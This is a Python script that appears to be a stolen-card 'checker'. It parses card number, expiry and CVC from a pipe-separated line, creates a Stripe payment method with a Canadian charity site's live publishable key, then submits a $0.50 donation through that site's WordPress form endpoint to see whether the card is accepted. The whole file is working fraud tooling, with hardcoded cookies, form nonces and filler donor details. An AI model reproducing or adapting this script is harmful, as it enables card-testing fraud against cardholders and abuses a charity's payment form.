import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F299e1ea907%3B+stripe-js-v3%2F299e1ea907%3B+card-element&referrer=https%3A%2F%2Fontarioheroes.ca&time_on_page=188388&client_attribution_metadata[client_session_id]=d9effe10-f2b2-49fd-93ab-d0d2addd93c0&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=3fcb4c44-7812-4be1-97ec-add4b38ba953&key=pk_live_51KyC7aCLoq7JcRThGLcWCXdUAI14qbuWIkoCuYCOLnvjKy257yEbRGkK3F99aAeu7yJJeQuxwCb2FGw3OFv8VVDU00W2Me8urc'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__cf_bm': 'tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw',
	    '_fbp': 'fb.2.1740399662778.157652016478123277',
	    'cookieyes-consent': 'consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
	    '_ga_59B60VWWYG': 'GS1.1.1740399662.1.0.1740399662.0.0.1057425111',
	    '_ga': 'GA1.1.1773205121.1740399663',
	    '__stripe_mid': '38e5065d-bd07-4873-a57f-fd46ac191fa53cd170',
    '__stripe_sid': 'cab5ff80-b493-4d26-b7c2-cbf58f3c6e715d8ad0',
	    '_gcl_au': '1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	}
	
	headers = {
	    'authority': 'ontarioheroes.ca',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__cf_bm=tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw; _fbp=fb.2.1740399662778.157652016478123277; cookieyes-consent=consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _ga_59B60VWWYG=GS1.1.1740399662.1.0.1740399662.0.0.1057425111; _ga=GA1.1.1773205121.1740399663; __stripe_mid=f435ef71-f199-4863-9e2b-f51dd02b4b2731905d; __stripe_sid=65f16e25-cf7e-4d24-b7ac-3a8b2b0927fa020fce; _gcl_au=1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	    'origin': 'https://ontarioheroes.ca',
	    'referer': 'https://ontarioheroes.ca/be-a-supporter/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1784004264480',
	}
	
	data = {
	    'data': 'item_51__fluent_sf=&__fluent_form_embded_post_id=125693&_fluentform_51_fluentformnonce=a11c9729fd&_wp_http_referer=%2Fbe-a-supporter%2F&names%5Bfirst_name%5D=Myat&names%5Blast_name%5D=Yoon&input_text_2=%2B16462713111&email=dede496912%40gmail.com&input_text=Tutu&custom-payment-amount=0.5&payment_method=stripe&__entry_intermediate_hash=d1ac7a54c073474e4187dc39da93f7b4&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '51',
	}
	
	r2 = requests.post('https://ontarioheroes.ca/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
